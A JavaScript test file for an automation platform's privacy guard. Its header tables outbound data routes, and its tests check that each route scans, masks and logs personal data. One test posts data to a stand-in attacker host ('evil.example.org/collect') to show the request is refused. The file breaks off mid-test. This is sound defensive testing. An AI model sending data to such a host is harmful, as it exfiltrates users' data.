/**
 * Every way out of an automation is guarded and logged.
 *
 * Four outbound paths used to bypass the Privacy Shield completely — no PII
 * scan, no `integration_activity_log` row, nothing in "What happened":
 *   - http_request           (arbitrary URL, body built from runState)
 *   - the code step's executeTool bridge
 *   - the code step's fetchHttp bridge
 *   - notification delivery   (in-app bell + owner email)
 *
 * These tests pin the contract rather than the wording: each path calls the
 * guard, asks prepareForEgress what may leave, and writes exactly one ledger
 * row (with the right destination classification).
 *
 * Since W2 this file is THE TABLE OF OUTBOUND ROUTES — the audit's finding was
 * that the code step's ctx.http request headers and its responses were simply
 * absent from it, which is exactly why those two holes survived a rewrite of
 * everything around them. Every route below is listed with the four things
 * that can carry personal data out (url / body / headers / response), plus the
 * dry-run rule that a `block` verdict must never be dispatched anyway:
 *
 *   route                    url  body  headers  response  dry-run block
 *   integration action        —    ✓      —         ✓          ✓
 *   ai step                   —    ✓      —         ✓          ✓
 *   http_request              ✓    ✓      ✓         ✓          ✓
 *   code step ctx.http        ✓    ✓      ✓         ✓         (skipped)
 *   code step ctx.callTool    —    ✓      —         ✓         (skipped)
 *   code step return value    —    —      —         ✓         (skipped)
 *   notification              —    ✓      —         —          —
 *   parse_json (ai mode)      —    ✓      —         ✓          ✓
 *   data_extraction           —    ✓      —         ✓         (never calls)
 *
 * A AUTOMATION IS NOT THE ONLY THING THAT LEAVES. The webpages light tier runs
 * author-written JavaScript in the SAME sandbox as the code step, so its ways
 * out belong in this table too. Their behaviour is pinned next to the module
 * (core/webpages/webpageEgress.test.js); the rows are here because this file
 * is the register, and the register is what the two missing code-step rows
 * above taught us to keep:
 *
 *   webpage ctx.http          ✓    ✓      ✓         ✓         (no dry run)
 *   webpage ctx.integrations  —    ✓      —         ✓         (no dry run)
 *   webpage return value      —    —      —         ✓         (no dry run)
 *   webpage AI bridge        ✗ NOT GUARDED — routes/webpagesPreview.js sends
 *                            page content to a model and logs SPEND, not
 *                            egress. Written down rather than left to be
 *                            rediscovered; see the test at the end.
 *
 * (a data_extraction dry run synthesises typed samples without a model call,
 * so its "dry-run block" cell is not reachable either.)
 *
 * (code steps do not run in dry-run at all — execCode returns early — so their
 * "dry-run block" cell is not reachable.)
 *
 * WHERE THE BYTES WENT. A ledger row is only as good as its destination, and
 * that is read off the call's own connections (core/http/egressCapture.js).
 * Every route above runs its call inside a capture context and hands the
 * probe to its row, the error row included: http_request, both code-step
 * bridges, notification mail, and the two webpage bridges.
 *
 * EVERY OTHER TOOL CALL goes through ONE chokepoint: toolDispatcher's
 * executeTool (core/tools/toolEgress.js). With no probe active it captures
 * the call itself and writes the row, attributed by the caller's
 * `context.egress`. The callers, with the source their rows carry:
 *
 *   caller                                   source            how
 *   chat (stream), direct chat, execAi       (their own)       own probe + row
 *   code step / webpage tool bridges         (their own)       own probe + row
 *   builder suggestion scan                  (automation policy)  own probe + row
 *   core/agentRuntime/chatWithAgent          agent_chat        chokepoint
 *   core/aiTaskRunner (automations, cowork)     automation|cowork    chokepoint
 *   core/swarms/swarmRuntime                 swarm             chokepoint
 *   routes/ai/voice                          voice             chokepoint
 *   routes/mcpServer (/mcp)                  mcp_server        chokepoint
 *   routes/nextcloudTaskProcessing           nextcloud_assistant chokepoint
 *   routes/webpagesPreview (AI + bridge)     webpage_ai|webpage_bridge chokepoint
 *   appStudio/connectors                     studio_app        chokepoint
 *   automation/triggerSources/pollDiff       trigger_poll      chokepoint
 *   automation/formPickRecord                form_pick         chokepoint
 *   routes/automation/catalog (columns)      —                 egress:false (UI read)
 *   routes/ncScope (resource picker)         —                 no dispatcher (UI read)
 *
 * Two more that cannot see a socket of their own:
 *   browse_web / App Studio ai_browse  → peers by host, basis 'browser' (the
 *                                        addresses live in the browser container)
 *   stdio MCP servers                  → one peer, basis 'child_process'
 *
 * And one that is deliberately NOT a row: a model call. The provider adapters
 * leave the capture context (core/providers/index.js).
 *
 * Run: node --test server/core/automationRunner/egressCoverage.test.js
 */
const test = require('node:test');
const assert = require('node:assert');

function mock(relPath, exports) {
    const resolved = require.resolve(relPath);
    require.cache[resolved] = { id: resolved, filename: resolved, loaded: true, exports };
}

mock('../../stores/automationStore', { getAutomation: async () => null, recordRunStep: async () => {} });
mock('../../stores/configStore', {
    // the platform kill-switch for code steps must be ON for these tests
    getConfig: async (k) => (k === 'automation_code_step_enabled' ? true : null),
    setConfig: async () => {},
});
mock('../../stores/notificationStore', { createNotification: async (n) => { bells.push(n); } });
mock('../../db', { pool: {} });
mock('../providers', { getAdapter: () => adapter });
// Mail: off unless a test turns it on (then the send can be made to fail).
let emailConfigured = false;
let emailFails = false;
const sentMail = [];
mock('../../utils/emailService', {
    getServiceEmailConfig: async () => ({ configured: emailConfigured }),
    sendServiceEmail: async (m) => { if (emailFails) throw new Error('smtp said no'); sentMail.push(m); },
});
mock('../../stores/userStore', { getUser: async (id) => ({ id, email: 'owner@acme.nl', organizationId: 'org1' }) });

const bells = [];

// ── LLM plumbing (ai_step + parse_json) ────────────────────────────────────
const chatCalls = [];
// 'done' is prose — an ai_step without a schema accepts it; a data_extraction
// step must be handed an object, so its tests set this.
let chatReply = 'done';
const adapter = {
    chat: async (apiKey, url, model, messages) => {
        chatCalls.push({ model, messages: JSON.parse(JSON.stringify(messages)) });
        return { content: chatReply, usage: { promptTokens: 1, completionTokens: 1 } };
    },
};
mock('../aiAgent', {
    getProviderForModel: async () => ({ providerType: 'openai', url: 'https://llm.example.com', apiKey: 'k' }),
    getAIConfig: async () => ({ model: 'test-model' }),
});
mock('../llm/modelResolver', {
    getUserTierMap: async () => ({ fast: { modelId: 'test-model' } }),
    resolveModelForTierName: async () => 'test-model',
});
mock('../entitlements/userTiers', { getPermittedTierKeys: async () => new Set(['fast']) });
const forcedToolCalls = [];
mock('../llm/llmClient', {
    chatForcedTool: async (model, messages) => {
        forcedToolCalls.push({ model, messages: JSON.parse(JSON.stringify(messages)) });
        return { structured: { naam: 'Jan de Vries' }, usage: {} };
    },
});
mock('../../stores/usageStore', { logUsage: async () => {} });
mock('../../stores/terminationStore', { logTermination: async () => {} });
mock('../../automation/shapeCache', { recordShape: async () => {} });
// The real module captures sockets; here every capture returns one marker
// snapshot, so a test can see that the probe reached the ledger row.
const PROBE = Object.freeze({ sealed: true, peers: Object.freeze([]), marker: 'captured' });
let captures = 0;
mock('../http/outboundProbe', {
    runWithProbe: async (fn) => { captures++; return { result: await fn(), probe: PROBE }; },
    markLocal: () => {},
});

// ── ssrfGuard / fetch ──────────────────────────────────────────────────────
const httpFetches = [];
let fetchImpl = async () => ({ status: 200, ok: true, headers: new Map(), text: async () => 'ok' });
mock('../../utils/ssrfGuard', {
    safeFetch: async (url, opts) => { httpFetches.push({ url, opts }); return fetchImpl(url, opts); },
    isPrivateAddressError: () => false,
});

// ── the code sandbox: hand the bridges straight back so we can call them ──
let capturedBridges = null;
mock('../../automation/codeSandbox', {
    isAvailable: () => true,
    loadError: () => null,
    runCode: async ({ bridges }) => { capturedBridges = bridges; return { result: { ok: true }, logs: [], http: [] }; },
    defaultFetchHttp: async (url, opts) => { sandboxFetches.push({ url, opts }); return { status: 200, body: 'ok' }; },
});
const sandboxFetches = [];

mock('../tools/toolDispatcher', { executeTool: async (name, args, opts) => { toolCalls.push({ name, args, opts }); return { ok: true }; } });
const toolCalls = [];
mock('../integrations/integrationTools', { getIntegrationTools: async () => ({ tools: [{ function: { name: 'gmail_send_email' } }] }) });
mock('../entitlements/betaFeatures', { orgHasBetaFeature: async () => true });

// ── safety: a recording pass-through ───────────────────────────────────────
const guardCalls = [];
const egressRows = [];
const prepareCalls = [];
// live: guardToolInput throws GuardrailBlockError.
let blockNext = false;
// dry-run: guardToolInput/guardAiInput return the payload UNTRANSFORMED with a
// wouldBlock verdict. Every outbound path must synthesize on that verdict —
// the whole point being that the request live mode blocks is never sent.
let wouldBlockNext = false;
// live: guardToolOutput throws (a `block` action on a third-party RESPONSE).
let blockOutputNext = false;
// Optional rewrite applied by the input guard, so a test can prove that what
// travels is built from the GUARDED value and not from the caller's object.
let rewriteGuardedValue = null;
class FakeBlock extends Error {
    constructor(m) { super(m); this.guardrailBlocked = true; this.categories = ['Email Address']; }
}
mock('./safety', {
    GuardrailBlockError: FakeBlock,
    resolveAutomationPolicy: async () => ({ piiEnabled: true, action: 'tokenize', privacyScope: 'external', regexRules: [], scope: {} }),
    buildAuditBase: (ctx, step) => ({ step_id: step && step.id, organization_id: 'org1' }),
    guardToolInput: async (v, p, a) => {
        guardCalls.push({ kind: 'input', step: a.step_id, value: v });
        if (blockNext) throw new FakeBlock('Blocked: sensitive data detected (Email Address)');
        if (wouldBlockNext) return { value: v, tokenMap: null, blocked: true, categories: ['Email Address'], markers: [], wouldBlock: true };
        return { value: rewriteGuardedValue ? rewriteGuardedValue(v) : v, tokenMap: {}, categories: [], markers: [] };
    },
    guardToolOutput: async (v, p, a) => {
        guardCalls.push({ kind: 'output', step: a.step_id, value: v });
        if (blockOutputNext) throw new FakeBlock('Blocked: sensitive data detected (Email Address)');
        return { result: v, tokenMap: {}, categories: [], markers: [] };
    },
    guardAiInput: async (messages, p, a) => {
        guardCalls.push({ kind: 'ai_input', step: a.step_id, value: JSON.parse(JSON.stringify(messages)) });
        if (wouldBlockNext) return { tokenMap: null, blocked: true, categories: ['Email Address'] };
        return { tokenMap: {}, blocked: false };
    },
    guardAiOutput: async (content, p, a) => {
        guardCalls.push({ kind: 'ai_output', step: a.step_id, value: content });
        return { content, tokenMap: {} };
    },
    prepareForEgress: (v, p, ctx, o) => { prepareCalls.push({ destination: o && o.destination, value: v }); return v; },
    restoreForRunState: (v) => v,
    buildPiiSummary: () => null,
    logEgress: async (row) => { egressRows.push(row); },
});

// engine.js exports every exec* primitive; the runner facade only re-exports some.
const {
    execHttpRequest, execCode, execNotification, execIntegrationAction, execAiStep, execParseJson,
    execDataExtraction,
} = require('./engine');

const state = () => ({ trigger: { output: {} }, steps: {}, vars: {}, secrets: {}, loop: {}, _templateWarnings: [] });
const ctx = () => ({ userId: 'u1', orgId: 'org1', automationId: 'a1', runId: 'r1' });

function reset() {
    guardCalls.length = 0; egressRows.length = 0; prepareCalls.length = 0;
    toolCalls.length = 0; sandboxFetches.length = 0; bells.length = 0;
    httpFetches.length = 0; chatCalls.length = 0; forcedToolCalls.length = 0;
    blockNext = false; wouldBlockNext = false; blockOutputNext = false;
    rewriteGuardedValue = null; capturedBridges = null; chatReply = 'done';
    emailConfigured = false; emailFails = false; sentMail.length = 0; captures = 0;
    fetchImpl = async () => ({ status: 200, ok: true, headers: new Map(), text: async () => 'ok' });
}

const inputGuards = () => guardCalls.filter(c => c.kind === 'input');
const outputGuards = () => guardCalls.filter(c => c.kind === 'output');

// ── integration action ─────────────────────────────────────────────────────

test('integration action: args guarded, result guarded, one ledger row', async () => {
    reset();
    const step = { id: 'i1', type: 'integration_action', tool: 'gmail_send_email', inputs: { to: 'jan@acme.nl' } };
    await execIntegrationAction(step, ctx(), state(), 'live');
    assert.strictEqual(inputGuards().length, 1, 'the tool args must be scanned');
    assert.strictEqual(outputGuards().length, 1, 'so must the tool result');
    assert.strictEqual(toolCalls.length, 1);
    assert.ok(egressRows.some(r => r.toolName === 'gmail_send_email' && !r.error));
});

test('integration action: a dry-run block verdict synthesizes instead of dispatching', async () => {
    reset();
    wouldBlockNext = true;
    const out = await execIntegrationAction(
        { id: 'i2', type: 'integration_action', tool: 'gmail_send_email', inputs: { to: 'jan@acme.nl' } },
        ctx(), state(), 'dry_run',
    );
    assert.strictEqual(toolCalls.length, 0, 'the one mode that must never leak may not dispatch');
    assert.strictEqual(out.dryRunSynthesised, true);
    assert.deepStrictEqual(out.output._guardrailWouldBlock, ['Email Address']);
});

// ── ai step ────────────────────────────────────────────────────────────────

test('ai step: the prompt is guarded and the reply is guarded on the way back', async () => {
    reset();
    const st = state();
    st.steps.s1 = { output: { name: 'Jan de Vries' }, status: 'success' };
    await execAiStep(
        { id: 'a1', type: 'ai_step', modelTier: 'fast', prompt: 'Mail {{steps.s1.output.name}}' },
        ctx(), st, 'live',
    );
    const prompt = guardCalls.find(c => c.kind === 'ai_input');
    assert.ok(prompt, 'the prompt must reach the guard before the model');
    assert.match(JSON.stringify(prompt.value), /Jan de Vries/, 'the INTERPOLATED prompt is what gets scanned');
    assert.strictEqual(chatCalls.length, 1);
    assert.ok(guardCalls.some(c => c.kind === 'ai_output'), 'the model reply is step output too');
});

test('ai step: a dry-run block verdict never reaches the model', async () => {
    reset();
    wouldBlockNext = true;
    const out = await execAiStep(
        { id: 'a2', type: 'ai_step', modelTier: 'fast', prompt: 'Mail jan@acme.nl' },
        ctx(), state(), 'dry_run',
    );
    assert.strictEqual(chatCalls.length, 0, 'the prompt live mode blocks must not be sent during a preview');
    assert.strictEqual(out.dryRunFallback, 'guardrail_block');
});

// ── data_extraction ────────────────────────────────────────────────────────

const extractionStep = (id) => ({
    id, type: 'data_extraction', source: { kind: 'ref', path: 'steps.s1.output.doc' },
    fields: [{ name: 'naam', type: 'string', description: 'Customer name' }],
});

test('data_extraction: the document is guarded before the model and the reply on the way back', async () => {
    reset();
    chatReply = '{"naam":"Jan de Vries"}';
    const st = state();
    st.steps.s1 = { output: { doc: 'Klant: Jan de Vries, jan@acme.nl' }, status: 'success' };
    const out = await execDataExtraction(extractionStep('x1'), ctx(), st, 'live');
    const prompt = guardCalls.find(c => c.kind === 'ai_input');
    assert.ok(prompt, 'the document must reach the guard before the model');
    assert.match(JSON.stringify(prompt.value), /Jan de Vries/, 'the RESOLVED document is what gets scanned');
    assert.strictEqual(chatCalls.length, 1);
    assert.ok(guardCalls.some(c => c.kind === 'ai_output'), 'the extracted values are step output too');
    assert.deepStrictEqual(out.output, { naam: 'Jan de Vries' });
});

test('data_extraction: a dry run never reaches the model at all', async () => {
    reset();
    wouldBlockNext = true;
    const st = state();
    st.steps.s1 = { output: { doc: 'Klant: jan@acme.nl' }, status: 'success' };
    const out = await execDataExtraction(extractionStep('x2'), ctx(), st, 'dry_run');
    assert.strictEqual(chatCalls.length, 0, 'no model call in a preview');
    assert.strictEqual(guardCalls.length, 0, 'nothing leaves, so nothing to guard');
    assert.strictEqual(out.dryRunSynthesised, true);
    assert.deepStrictEqual(Object.keys(out.output), ['naam']);
});

// ── parse_json (ai mode) ───────────────────────────────────────────────────

const parseJsonStep = (id) => ({
    id, type: 'parse_json', mode: 'ai', sourceRef: 'steps.s1.output.doc',
    fields: [{ name: 'naam', path: 'naam', type: 'string' }],
});
const parseJsonState = () => {
    const st = state();
    st.steps.s1 = { output: { doc: { tekst: 'Mail Jan de Vries' } }, status: 'success' };
    return st;
};

test('parse_json (ai): the extraction prompt is guarded and the result restored', async () => {
    reset();
    await execParseJson(parseJsonStep('p1'), ctx(), parseJsonState(), 'live');
    assert.ok(guardCalls.some(c => c.kind === 'ai_input'), 'the source document reaches a third-party model');
    assert.strictEqual(forcedToolCalls.length, 1);
    assert.ok(guardCalls.some(c => c.kind === 'ai_output'));
});

test('parse_json (ai): a dry-run block verdict never reaches the model', async () => {
    reset();
    wouldBlockNext = true;
    const out = await execParseJson(parseJsonStep('p2'), ctx(), parseJsonState(), 'dry_run');
    assert.strictEqual(forcedToolCalls.length, 0);
    assert.strictEqual(out.dryRunFallback, 'guardrail_block');
});

// ── http_request ───────────────────────────────────────────────────────────

test('http_request: guarded, classified external, and logged', async () => {
    reset();
    const step = { id: 'h1', type: 'http_request', method: 'POST', url: 'https://hooks.example.com/x', body: 'name=Jan' };
    await execHttpRequest(step, ctx(), state(), 'live');
    assert.strictEqual(inputGuards().length, 1, 'the payload must be scanned');
    assert.strictEqual(prepareCalls[0].destination, 'external');
    const row = egressRows.find(r => r.toolName === 'http_request' && !r.error);
    assert.ok(row, 'a webhook call must leave a ledger row');
    assert.strictEqual(row.integMeta.integration, 'http_request');
    assert.strictEqual(row.integMeta.isLocal, false);
});

test('http_request: a private target is classified internal, not third-party', async () => {
    reset();
    const step = { id: 'h2', type: 'http_request', method: 'POST', url: 'http://192.168.1.9/hook', body: 'x' };
    await execHttpRequest(step, ctx(), state(), 'live');
    assert.strictEqual(prepareCalls[0].destination, 'internal');
    assert.strictEqual(egressRows[0].integMeta.isLocal, true);
});

test('http_request: the RESPONSE is guarded before it enters runState', async () => {
    reset();
    fetchImpl = async () => ({ status: 200, ok: true, headers: new Map(), text: async () => '{"email":"jan@acme.nl"}' });
    await execHttpRequest({ id: 'h3', type: 'http_request', url: 'https://api.example.com/x' }, ctx(), state(), 'live');
    assert.ok(outputGuards().length, 'a webhook reply can carry personal data too');
});

test('http_request: url, body AND headers all go through the guard', async () => {
    reset();
    rewriteGuardedValue = (v) => JSON.parse(JSON.stringify(v).replace(/jan@acme\.nl/g, '[email_1]'));
    await execHttpRequest(
        {
            id: 'h6', type: 'http_request', method: 'POST', url: 'https://hooks.example.com/x',
            body: 'b', headers: { 'X-Customer': 'jan@acme.nl' },
        },
        ctx(), state(), 'live',
    );
    const guarded = inputGuards()[0];
    assert.deepStrictEqual(Object.keys(guarded.value).sort(), ['body', 'headers', 'url']);
    assert.strictEqual(guarded.value.headers['X-Customer'], 'jan@acme.nl');
    assert.strictEqual(httpFetches[0].opts.headers['X-Customer'], '[email_1]',
        'what travels must be the guarded header, not the caller\'s copy');
});

test('http_request: a failed call still leaves an error row', async () => {
    reset();
    fetchImpl = async () => { throw new Error('ECONNRESET'); };
    await assert.rejects(execHttpRequest({ id: 'h4', type: 'http_request', url: 'https://api.example.com/x' }, ctx(), state(), 'live'));
    assert.ok(egressRows.some(r => r.error), 'the bytes had already left the box');
});

test('BFSF-436: an over-cap response leaves EXACTLY ONE error-shaped row — never a success row, never double-logged', async () => {
    reset();
    const big = 'x'.repeat(1024 * 1024 + 1);
    fetchImpl = async () => ({ status: 200, ok: true, headers: new Map(), text: async () => big });
    await assert.rejects(
        execHttpRequest({ id: 'h8', type: 'http_request', url: 'https://api.example.com/big' }, ctx(), state(), 'live'),
        /response body exceeded the 1 MiB limit/,
    );
    const rows = egressRows.filter(r => r.toolName === 'http_request');
    assert.strictEqual(rows.length, 1, 'the truncation check runs before the success logEgress call, so no success row is ever written');
    assert.ok(rows[0].error, 'the one row it leaves is error-shaped');
    assert.ok(!rows[0].result, 'never a result-shaped (success) row for this call');
});

test('http_request: a blocked payload never reaches fetch, and is logged as blocked', async () => {
    reset();
    blockNext = true;
    await assert.rejects(
        execHttpRequest({ id: 'h5', type: 'http_request', method: 'POST', url: 'https://hooks.example.com/x', body: 'x' }, ctx(), state(), 'live'),
        (e) => e.guardrailBlocked === true,
    );
    assert.strictEqual(httpFetches.length, 0);
    assert.ok(egressRows.some(r => r.blocked === true));
});

test('http_request: a dry-run block verdict is synthesized, not sent', async () => {
    // The verdict used to be read by execIntegrationAction, execAiStep and
    // execParseJson but NOT here: guardedHttp.guarded.wouldBlock was never
    // consulted, so the exact request that live mode blocks was dispatched
    // during a preview — with the payload UNTRANSFORMED, which is what a
    // dry-run `block` returns.
    reset();
    wouldBlockNext = true;
    const out = await execHttpRequest(
        { id: 'h7', type: 'http_request', method: 'GET', url: 'https://api.example.com/x' },
        ctx(), state(), 'dry_run',
    );
    assert.strictEqual(httpFetches.length, 0, 'a dry-run must never send what live mode blocks');
    assert.strictEqual(out.dryRunSynthesised, true);
    assert.strictEqual(out.dryRunFallback, 'guardrail_block');
    assert.deepStrictEqual(out.output._guardrailWouldBlock, ['Email Address']);
});

// ── notification ───────────────────────────────────────────────────────────

test('notification: the bell is internal, email is external — and both are logged', async () => {
    reset();
    await execNotification({ id: 'n1', type: 'notification', channels: ['notification'], title: 'T', body: 'B' }, ctx(), state(), 'live');
    assert.strictEqual(prepareCalls[0].destination, 'internal', 'the bell does not leave the platform');
    assert.strictEqual(egressRows[0].integMeta.integration, 'notification_inapp');
    assert.strictEqual(bells.length, 1);

    reset();
    emailConfigured = true;
    await execNotification({ id: 'n2', type: 'notification', channels: ['email'], title: 'T', body: 'B' }, ctx(), state(), 'live');
    assert.strictEqual(prepareCalls[0].destination, 'external', 'email leaves the platform');
    assert.strictEqual(egressRows[0].integMeta.integration, 'notification_email');
});

test('notification: a mail that was never sent writes no email row (BFSF-350)', async () => {
    // No service mailbox: sendRunEmail skips. The ledger used to record a
    // delivered email anyway; now only what actually went out is logged.
    reset();
    await execNotification({ id: 'n4', type: 'notification', channels: ['email'], title: 'T', body: 'B' }, ctx(), state(), 'live');
    assert.strictEqual(sentMail.length, 0);
    assert.strictEqual(egressRows.length, 0, 'nothing left the platform, nothing was delivered');

    reset();
    await execNotification({ id: 'n5', type: 'notification', channels: ['notification', 'email'], title: 'T', body: 'B' }, ctx(), state(), 'live');
    assert.strictEqual(bells.length, 1);
    assert.strictEqual(egressRows.length, 1);
    assert.strictEqual(egressRows[0].integMeta.integration, 'notification_inapp', 'only the bell is logged as delivered');
});

test('notification: what is delivered is what the guard returned', async () => {
    reset();
    const st = state();
    st.steps.s1 = { output: { name: 'Jan de Vries' }, status: 'success' };
    await execNotification(
        { id: 'n3', type: 'notification', channels: ['notification'], title: 'T', body: 'Mail aan {{steps.s1.output.name}}' },
        ctx(), st, 'live',
    );
    assert.match(guardCalls[0].value.body, /Jan de Vries/, 'the interpolated body is what gets scanned');
    assert.match(bells[0].message, /Jan de Vries/);
});

// ── the code step's two bridges ────────────────────────────────────────────

// Code that names the host its bridge is then called with: a code step may
// only reach the hosts its code names or its `allowedHosts` lists
// (core/automationRunner/codeStepGuard.js).
const FETCHES_API = 'return ctx.http("https://api.example.com/x");';

test('code step: the executeTool bridge is guarded and logged like any tool call', async () => {
    reset();
    await execCode({ id: 'c1', type: 'code', code: 'x', allowedTools: ['gmail_send_email'] }, ctx(), state(), 'live');
    assert.ok(capturedBridges, 'the sandbox got its bridges');
    await capturedBridges.executeTool('gmail_send_email', { to: 'jan@acme.nl' });
    assert.strictEqual(toolCalls.length, 1, 'the call still happens');
    assert.ok(inputGuards().length, 'the args are scanned now');
    assert.ok(egressRows.some(r => r.toolName === 'gmail_send_email'), 'and it lands in the ledger');
});

test('code step: a blocked tool call returns an error instead of dispatching', async () => {
    reset();
    await execCode({ id: 'c2', type: 'code', code: 'x', allowedTools: ['gmail_send_email'] }, ctx(), state(), 'live');
    blockNext = true;
    const r = await capturedBridges.executeTool('gmail_send_email', { to: 'jan@acme.nl' });
    assert.match(r.error, /Blocked/);
    assert.strictEqual(toolCalls.length, 0, 'nothing may leave');
});

test('code step: the fetchHttp bridge is guarded and logged', async () => {
    reset();
    await execCode({ id: 'c3', type: 'code', code: FETCHES_API }, ctx(), state(), 'live');
    await capturedBridges.fetchHttp('https://api.example.com/x', { method: 'POST', body: 'name=Jan' });
    assert.strictEqual(sandboxFetches.length, 1);
    assert.strictEqual(prepareCalls.at(-1).destination, 'external');
    assert.ok(egressRows.some(r => r.toolName === 'code_fetch_http'));
});

test('code step: ctx.http to a host the code does not name is refused before anything leaves', async () => {
    reset();
    await execCode({ id: 'c4', type: 'code', code: FETCHES_API }, ctx(), state(), 'live');
    const r = await capturedBridges.fetchHttp('https://evil.example.org/collect', { method: 'POST', body: 'x' });
    assert.match(r.error, /may only send data to api\.example\.com/);
    assert.strictEqual(sandboxFetches.length, 0, 'nothing was sent');
});

test('code step ctx.http: request HEADERS are guarded, and the guarded copy is what travels', async () => {
    // The bridge guarded only {url, body} and then forwarded the caller's
    // `options` straight to safeFetch, so anything the sandboxed code put in a
    // header left the platform unscanned, unmasked and unaudited.
    reset();
    await execCode({ id: 'c5', type: 'code', code: FETCHES_API }, ctx(), state(), 'live');
    rewriteGuardedValue = (v) => JSON.parse(JSON.stringify(v).replace(/jan@acme\.nl/g, '[email_1]'));
    await capturedBridges.fetchHttp('https://api.example.com/x', {
        method: 'POST', body: 'b', headers: { 'X-Customer': 'jan@acme.nl' },
    });
    const guarded = inputGuards().at(-1);
    assert.ok(guarded.value.headers, 'headers must be part of the guarded payload');
    assert.strictEqual(guarded.value.headers['X-Customer'], 'jan@acme.nl');
    assert.strictEqual(sandboxFetches.at(-1).opts.headers['X-Customer'], '[email_1]',
        'the outgoing options must be built from the guarded result');
});

test('code step ctx.http: the RESPONSE goes through guardToolOutput before the sandbox sees it', async () => {
    // execHttpRequest has always guarded its reply; this bridge did not, so the
    // same third-party body that a `block` policy stops on an http_request step
    // landed freely in runState via a code step.
    reset();
    await execCode({ id: 'c6', type: 'code', code: FETCHES_API }, ctx(), state(), 'live');
    const before = outputGuards().length;
    const res = await capturedBridges.fetchHttp('https://api.example.com/x', {});
    assert.strictEqual(outputGuards().length, before + 1, 'a third-party body must not enter runState unscanned');
    assert.deepStrictEqual(outputGuards().at(-1).value, { status: 200, body: 'ok' });
    assert.deepStrictEqual(res, { status: 200, body: 'ok' }, 'and the restored value is what user code gets');
});

test('code step ctx.http: a blocked response comes back as { error }, not as data', async () => {
    reset();
    await execCode({ id: 'c7', type: 'code', code: FETCHES_API }, ctx(), state(), 'live');
    blockOutputNext = true;
    const r = await capturedBridges.fetchHttp('https://api.example.com/x', {});
    assert.match(r.error, /Blocked/, 'the sandbox already speaks the { error } shape');
    assert.strictEqual(r.status, undefined, 'the body must not come through alongside the error');
});

test('code step: the sandbox return value is guarded before it lands in runState', async () => {
    reset();
    const out = await execCode({ id: 'c8', type: 'code', code: 'x' }, ctx(), state(), 'live');
    const stepOut = outputGuards().find(c => c.step === 'c8');
    assert.ok(stepOut, 'the step output used to reach runState with no output guard at all');
    assert.deepStrictEqual(stepOut.value, { result: { ok: true }, logs: [] });
    assert.deepStrictEqual(out.output.result, { ok: true });
    assert.deepStrictEqual(out.output.logs, []);
});

test('code step: an unpermitted tool is still refused before any guard work', async () => {
    reset();
    await execCode({ id: 'c4', type: 'code', code: 'x', allowedTools: [] }, ctx(), state(), 'live');
    const before = inputGuards().length;
    const r = await capturedBridges.executeTool('gmail_send_email', {});
    assert.match(r.error, /not allowed/);
    assert.strictEqual(inputGuards().length, before);
});

// ── where the bytes went: every route's row carries its probe ─────────────

test('http_request: the success row and the error row both carry the call\'s probe', async () => {
    reset();
    await execHttpRequest({ id: 'p1', type: 'http_request', url: 'https://api.example.com/x' }, ctx(), state(), 'live');
    assert.strictEqual(egressRows.find(r => r.toolName === 'http_request').probe, PROBE);

    reset();
    fetchImpl = async () => { throw new Error('ECONNRESET'); };
    await assert.rejects(execHttpRequest({ id: 'p2', type: 'http_request', url: 'https://api.example.com/x' }, ctx(), state(), 'live'));
    const row = egressRows.find(r => r.toolName === 'http_request');
    assert.ok(row.error);
    assert.strictEqual(row.probe, PROBE, 'a failed call keeps what its sockets saw');
});

test('code step: the tool bridge dispatches inside its own probe, opted out of a second row', async () => {
    reset();
    await execCode({ id: 'p3', type: 'code', code: 'x', allowedTools: ['gmail_send_email'] }, ctx(), state(), 'live');
    await capturedBridges.executeTool('gmail_send_email', { to: 'jan@acme.nl' });
    assert.strictEqual(toolCalls[0].opts.egress, false, 'the dispatcher must not write a second row');
    const rows = egressRows.filter(r => r.toolName === 'gmail_send_email');
    assert.strictEqual(rows.length, 1);
    assert.strictEqual(rows[0].probe, PROBE);
});

test('code step: the fetchHttp bridge row carries the probe', async () => {
    reset();
    await execCode({ id: 'p4', type: 'code', code: FETCHES_API }, ctx(), state(), 'live');
    await capturedBridges.fetchHttp('https://api.example.com/x', {});
    assert.strictEqual(egressRows.find(r => r.toolName === 'code_fetch_http').probe, PROBE);
});

test('notification mail: captured, and a failed send is an error row, not silence', async () => {
    reset();
    emailConfigured = true;
    await execNotification({ id: 'p5', type: 'notification', channels: ['email'], title: 'T', body: 'B' }, ctx(), state(), 'live');
    assert.strictEqual(sentMail.length, 1);
    assert.strictEqual(egressRows[0].probe, PROBE);
    assert.ok(!egressRows[0].error);

    reset();
    emailConfigured = true;
    emailFails = true;
    await assert.rejects(
        execNotification({ id: 'p6', type: 'notification', channels: ['email'], title: 'T', body: 'B' }, ctx(), state(), 'live'),
        /smtp said no/,
    );
    assert.strictEqual(egressRows.length, 1);
    assert.match(egressRows[0].error.message, /smtp said no/);
    assert.strictEqual(egressRows[0].probe, PROBE);
});

test('notification: the in-app bell is not captured (nothing leaves)', async () => {
    reset();
    await execNotification({ id: 'p7', type: 'notification', channels: ['notification'], title: 'T', body: 'B' }, ctx(), state(), 'live');
    assert.strictEqual(captures, 0);
    assert.strictEqual(egressRows[0].probe, null);
});

// ── the chokepoint's callers say whose call it was ─────────────────────────

test('trigger poll: the source tool is dispatched with trigger_poll attribution', async () => {
    const { runPollDiff, makePassCtx } = require('../../automation/triggerSources/pollDiff');
    const seen = [];
    const passCtx = makePassCtx({
        executeTool: async (tool, args, opts) => { seen.push(opts); return { widgets: [] }; },
        resolveEntitlements: async () => ({ effective: { integration: new Set(['acme']) } }),
    });
    await runPollDiff(
        { id: 'sub-1', userId: 'u1', automationId: 'auto-9', triggerStepId: 'trig', lastCursor: null },
        { id: 'w.changed', source: {
            kind: 'poll_diff', tool: 'acme_list_widgets', requiresIntegration: 'acme', itemsPath: 'widgets',
            idPath: 'sku', changePaths: ['state'], emit: { mode: 'item', map: { sku: 'sku' } },
        } },
        passCtx,
        { automationStore: { updateSubscription: async () => {} } },
    );
    assert.strictEqual(seen.length, 1);
    assert.strictEqual(seen[0].egress.source, 'trigger_poll');
    assert.deepStrictEqual(seen[0].egress.ids, { user_id: 'u1', automation_id: 'auto-9', step_id: 'trig' });
});

test('App Studio connector: the data source is dispatched with studio_app attribution', async () => {
    const { runConnector } = require('../../appStudio/connectors');
    const seen = [];
    await runConnector({ id: 'c1', kind: 'integration_tool', tool: 'gmail_list_messages' }, {
        app: { id: 'app1', userId: 'owner', organizationId: 'org1', name: 'Klanten' },
        params: {},
        _deps: {
            executeTool: async (tool, args, opts) => { seen.push(opts); return { messages: [] }; },
